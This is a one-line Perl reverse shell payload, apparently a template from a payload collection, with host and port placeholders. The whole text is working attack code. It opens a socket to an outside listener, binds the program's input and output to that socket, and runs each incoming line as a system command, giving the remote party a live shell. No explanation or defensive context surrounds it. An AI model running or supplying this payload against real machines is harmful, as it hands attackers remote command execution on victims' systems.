use IO::Socket::INET;$c=new IO::Socket::INET(PeerAddr,"{{ LHOST }}:{{ LPORT }}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;
